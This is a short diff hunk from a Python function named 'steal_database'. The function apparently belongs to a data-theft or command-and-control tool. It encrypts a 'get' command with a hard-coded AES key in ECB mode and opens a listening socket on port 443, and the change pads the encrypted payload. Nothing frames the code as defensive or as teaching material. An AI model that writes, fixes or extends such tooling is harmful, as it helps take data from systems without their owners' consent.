@@ -33,7 +33,7 @@ def steal_database():
     print(bytes.fromhex(key))
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_ECB)
-    ciphertext = obj.encrypt("get0000000000000")
+    ciphertext = obj.encrypt(b"get0000000000000" + b"\x00" * 16)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
     s.bind(('', port))
